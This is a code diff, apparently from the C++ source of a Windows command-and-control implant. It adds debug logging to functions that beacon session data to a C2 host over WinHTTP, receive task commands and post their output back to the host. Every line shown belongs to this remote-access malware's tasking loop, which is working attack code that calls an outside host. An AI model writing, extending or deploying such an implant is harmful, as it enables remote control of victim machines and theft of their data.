@@ -278,8 +278,17 @@ BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
     std::string plainBody = BuildBeaconJson(session);
 
     DebugLog(L"Sending beacon to " + GetC2Host());
+    DebugLog(L"Beacon JSON: " + UTF8ToWString(plainBody));
     HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
                                        L"POST", L"/beacon", plainBody, L"");
+    DebugLog(L"Beacon status: " + std::to_wstring(resp.status));
+    // Log the response body — critical for diagnosing silent Worker errors
+    if (!resp.body.empty()) {
+        DebugLog(L"Beacon body: " + UTF8ToWString(resp.body));
+    } else {
+        DebugLog(L"Beacon body: (empty)");
+    }
+
     if (resp.status != 200) {
         DebugLog(L"Beacon failed: HTTP " + std::to_wstring(resp.status));
         return FALSE;
@@ -289,6 +298,8 @@ BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
     if (!cmd.empty()) {
         taskOut = UTF8ToWString(cmd);
         DebugLog(L"Task received: " + taskOut);
+    } else {
+        DebugLog(L"No task — sleeping");
     }
     return TRUE;
 }
@@ -301,8 +312,12 @@ BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
     std::string out = JsonEscape(WStringToUTF8(output));
     std::string plainBody = "{\"session\":\"" + sid +
                             "\",\"output\":\"" + out + "\"}";
+    DebugLog(L"Sending result " + std::to_wstring(output.size()) + L" chars");
     HttpResponse resp = WinHttpRequest(GetC2Host(), config::C2_PORT,
                                        L"POST", L"/result", plainBody, L"");
+    DebugLog(L"Result status: " + std::to_wstring(resp.status));
+    if (!resp.body.empty())
+        DebugLog(L"Result body: " + UTF8ToWString(resp.body));
     return (resp.status == 200);
 }
 
@@ -514,6 +529,9 @@ VOID BeaconLoop() {
             BOOL ok = FALSE;
 
             if (!dnsMode) {
+                static DWORD beaconCount = 0;
+                ++beaconCount;
+                DebugLog(L"BeaconLoop iteration #" + std::to_wstring(beaconCount));
                 ok = SendBeacon(session, task);
             }
 
